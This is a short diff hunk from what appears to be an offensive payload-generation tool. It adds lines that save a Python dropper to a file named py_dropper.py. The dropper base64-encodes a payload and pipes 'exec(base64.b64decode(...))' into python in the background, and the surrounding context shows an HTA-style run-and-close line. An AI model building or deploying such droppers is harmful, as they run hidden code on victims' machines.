@@ -333,6 +333,10 @@ ao.run('%s', 0);window.close();
     py = base64.b64encode(self.Python)
     #print self.Python
     pydropper = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
+    filename = "%spy_dropper.py" % (self.BaseDirectory)
+    output_file = open(filename, 'w')
+    output_file.write(pydropper)
+    output_file.close()
     self.QuickstartLog( pydropper )
 
   def CreateEXE(self, name=""):
